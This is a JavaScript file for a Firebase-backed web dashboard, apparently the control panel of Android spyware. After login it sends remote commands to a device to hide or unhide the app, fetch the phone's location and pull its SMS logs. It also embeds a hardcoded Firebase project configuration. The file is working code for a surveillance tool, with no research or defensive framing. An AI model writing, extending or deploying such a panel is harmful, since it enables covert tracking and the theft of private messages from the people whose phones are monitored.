// ✅ Firebase Setup
import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
import {
  getAuth,
  onAuthStateChanged,
  signOut
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-auth.js";
import {
  getDatabase,
  ref,
  set,
  update,
  get
} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyCW87BPPsuA_AsNCzqfEEVFSvHF-SP100k",
  authDomain: "android-service-54676.firebaseapp.com",
  databaseURL: "https://android-service-54676-default-rtdb.firebaseio.com",
  projectId: "android-service-54676",
  storageBucket: "android-service-54676.appspot.com",
  messagingSenderId: "446333235153",
  appId: "1:446333235153:web:f7366fd64166b83d5b3af0"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

// ✅ Sidebar toggle
const hideBtn = document.getElementById("hideBtn");
const showBtn = document.getElementById("showBtn");
const navHeading = document.querySelector(".navHeading");

function hideSidebar() {
  document.body.classList.add("hide-sidebar");
  document.body.classList.remove("show-sidebar");
  showBtn.style.display = "inline-block";
  navHeading.style.display = "flex";
}

function showSidebar() {
  document.body.classList.remove("hide-sidebar");
  document.body.classList.add("show-sidebar");
  showBtn.style.display = "none";
  navHeading.style.display = "none";
}

if (hideBtn && showBtn) {
  hideBtn.addEventListener("click", hideSidebar);
  showBtn.addEventListener("click", showSidebar);
}

// ✅ Refresh site button
document.getElementById("refreshSiteBtn")?.addEventListener("click", () => location.reload());

// ✅ Page Loader Function (updated to use pushState)
window.dashboard = (pageName, useHistory = true) => {
  pageName = pageName.replace(/\.(html|php)$/i, ""); // Sanitize

  // Update URL using history.pushState
  if (useHistory) {
    // history.pushState({ page: pageName }, "", `/dashboard/${pageName}`);
    const hash = window.location.hash;
    const initialPage = hash ? hash.substring(1) : "dashboard";
    dashboard(initialPage, false);

  }

  fetch(`${pageName}.html`)
    .then(res => res.text())
    .then(html => {
      const contentContainer = document.querySelector(".main-content");
      contentContainer.innerHTML = html;

      // Reload page-specific JS
      const existingScript = document.getElementById("dynamic-script");
      if (existingScript) existingScript.remove();

      const newScript = document.createElement("script");
      newScript.type = "module";
      newScript.src = `${pageName}.js`;
      newScript.id = "dynamic-script";
      document.body.appendChild(newScript);

      // Highlight menu
      const links = document.querySelectorAll(".sidebar .menu-link");
      links.forEach(link => link.classList.remove("active"));
      const activeLink = Array.from(links).find(link =>
        link.getAttribute("onclick")?.includes(pageName)
      );
      if (activeLink) activeLink.classList.add("active");
    })
    .catch(err => console.error(`❌ Failed to load ${pageName}:`, err));
};

// ✅ Handle browser back/forward buttons
window.onpopstate = (event) => {
  if (event.state?.page) {
    dashboard(event.state.page, false); // Don't push state again
  }
};

// ✅ Firebase Logout
window.logout = () => {
  signOut(auth).then(() => {
    localStorage.removeItem("uid");
    window.location.href = "index.html";
  });
};

// ✅ Command Sender
// function sendCommand(section, commandValue) {
//   const user = auth.currentUser;
//   if (!user) return console.warn("User not authenticated");

//   const commandRef = ref(db, `users/${user.uid}/${section}/command`);

//   set(commandRef, {
//     value: commandValue,
//     timestamp: new Date().toISOString()
//   })
//     .then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
//     .catch(err => console.error("❌ Command Error:", err));
// }


// ✅ Safe Command Sender
function sendCommand(section, commandValue) {
  const user = auth.currentUser;
  if (!user) return console.warn("User not authenticated");

  const sectionRef = ref(db, `users/${user.uid}/${section}`);

  update(sectionRef, {
    command: {
      value: commandValue,
      timestamp: new Date().toISOString()
    }
  })
    .then(() => console.log(`✅ Sent '${commandValue}' to ${section}`))
    .catch(err => console.error("❌ Command Error:", err));
}


// ✅ Main Auth State Listener
onAuthStateChanged(auth, async (user) => {
  if (!user) {
    window.location.href = "index.html";
  } else {
    const uid = user.uid;
    localStorage.setItem("uid", uid);
    
    // ✅ On initial load, determine which page to show
    const path = window.location.pathname;
    const match = path.match(/\/dashboard\/([^\/]+)/);
    const initialPage = match?.[1] || "dashboard";
    dashboard(initialPage, false); // Load page without pushing state again

    // Load user data (optional)
    const userRef = ref(db, `users/${uid}`);
    try {
      const snapshot = await get(userRef);
      if (snapshot.exists()) {
        console.log("✅ User Data:", snapshot.val());
      }
    } catch (err) {
      console.error("❌ Error loading user data:", err);
    }

    // Bind remote control command buttons
    const hideToggle = document.getElementById("hideToggle");
    const unhideToggle = document.getElementById("unhideToggle");

    if (hideToggle) {
      hideToggle.addEventListener("click", () => {
        sendCommand("remote-command", "hideApp");
      });
    }

    if (unhideToggle) {
      unhideToggle.addEventListener("click", () => {
        sendCommand("remote-command", "unhideApp");
      });
    }

    //Location commands
    const getLocationBtn = document.getElementById("getLocationBtn");
  if (getLocationBtn) {
  getLocationBtn.addEventListener("click", () => {
    sendCommand("location", "getLocation");
  });
}

//sms commands
 const getSmsBtn = document.getElementById("getSmsBtn");
  if (getSmsBtn) {
  getSmsBtn.addEventListener("click", () => {
    sendCommand("sms", "getSmsLogs");
  });
}

  }
});
